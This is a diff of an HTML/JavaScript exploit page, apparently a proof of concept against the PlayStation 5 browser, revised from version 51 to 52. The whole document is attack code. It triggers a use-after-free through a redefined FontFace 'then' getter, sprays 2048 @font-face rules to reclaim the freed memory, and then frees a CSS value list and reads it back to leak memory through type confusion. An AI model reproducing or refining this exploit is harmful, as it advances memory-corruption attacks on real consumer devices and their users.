@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 - CSSPrimitiveValue Union Confusion (v51)</title>
+<title>PS5 - CSSValue Type Confusion (v52)</title>
 <style>
 body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
 pre { white-space: pre-wrap; word-wrap: break-word; }
@@ -14,7 +14,7 @@ pre { white-space: pre-wrap; word-wrap: break-word; }
 var out = document.getElementById("out");
 function log(m) { out.textContent += m + "\n"; }
 
-log("=== CSSPrimitiveValue Union Type Confusion (v51) ===\n");
+log("=== CSSValue Type Confusion (v52) ===\n");
 
 // Step 1: Setup UAF
 log("[*] Step 1: Setting up UAF environment...");
@@ -22,14 +22,8 @@ var sheet = document.createElement('style');
 document.head.appendChild(sheet);
 var cssSheet = sheet.sheet;
 
-// Create trigger and target faces
 cssSheet.insertRule('@font-face { font-family: trigger; src: local(no-such-font); }', 0);
 cssSheet.insertRule('@font-face { font-family: x; src: local(no-such-font-2); }', 1);
-
-// Create A_ faces
-for (var i = 0; i < 2048; i++) {
-    cssSheet.insertRule('@font-face { font-family: A_' + i + '; src: local(no-such-font-' + i + '); }', 2 + i);
-}
 
 var uafFired = false;
 var triggerFace = new FontFace('trigger', "url(data:font/woff2;base64,AA==)");
@@ -42,10 +36,9 @@ Object.defineProperty(FontFace.prototype, "then", {
             log("[*] UAF triggered! Freeing 'x' and spraying A_ faces...");
             cssSheet.deleteRule(1); // Free "x" CSSFontFace
             
-            // Spray A_ faces to reclaim the freed slot
-            // The "x" selector will now point to one of the A_ faces
+            // Spray A_ faces INSIDE the getter to reclaim the slot immediately
             for (var i = 0; i < 2048; i++) {
-                // Already inserted, just need to trigger allocation
+                cssSheet.insertRule('@font-face { font-family: A_' + i + '; src: local(no-such-font-' + i + '); }', 2 + i);
             }
         }
         return undefined;
@@ -54,7 +47,7 @@ Object.defineProperty(FontFace.prototype, "then", {
 
 document.fonts.add(triggerFace);
 
-// Step 2: Trigger the load to get the confused FontFace
+// Step 2: Trigger the load
 log("[*] Step 2: Triggering load('1em trigger, x', 'AB')...");
 document.fonts.load("1em trigger, x", "AB").then(function(faces) {
     log("[*] Load returned " + faces.length + " faces");
@@ -64,13 +57,11 @@ document.fonts.load("1em trigger, x", "AB").then(function(faces) {
         return;
     }
     
-    var confusedFace = faces[1]; // This should be A_NN
+    var confusedFace = faces[1]; 
     log("[+] Confused face obtained: family=" + confusedFace.family);
     
-    // Step 3: Test CSSPrimitiveValue Union Confusion
+    // Step 3: Find the CSSRule
     log("\n[*] Step 3: Testing Union Type Confusion...");
-    
-    // Find the CSSRule for the confused face
     var confusedRuleIndex = -1;
     var confusedFamily = confusedFace.family;
     for (var i = 0; i < cssSheet.cssRules.length; i++) {
@@ -88,7 +79,7 @@ document.fonts.load("1em trigger, x", "AB").then(function(faces) {
     var confusedRule = cssSheet.cssRules[confusedRuleIndex];
     log("[*] Found CSSRule at index " + confusedRuleIndex);
     
-    // Change font-family to free the old CSSValueList
+    // Step 4: Free old CSSValueList by changing font-family
     log("[*] Freeing old CSSValueList by changing font-family...");
     confusedRule.style.fontFamily = "FreedFam1";
     
@@ -102,7 +93,7 @@ document.fonts.load("1em trigger, x", "AB").then(function(faces) {
         calcElements.push(el);
     }
     
-    // Read font-family back - if type confusion worked, we might read a pointer as a string
+    // Read font-family back
     log("[*] Reading font-family back...");
     try {
         var readFamily = confusedFace.family;
@@ -122,9 +113,10 @@ document.fonts.load("1em trigger, x", "AB").then(function(faces) {
     // Cleanup
     for (var el of calcElements) el.remove();
     
-    log("\n=== v51 COMPLETE ===");
+    log("\n=== v52 COMPLETE ===");
 }).catch(function(e) {
-    log("[-] Error: " + e.message);
+    log("[-] Load Promise Rejected: " + e.message);
+    log("[-] This usually means the trigger face failed to load. Checking if confusion still happened...");
 });
 </script>
 </body>
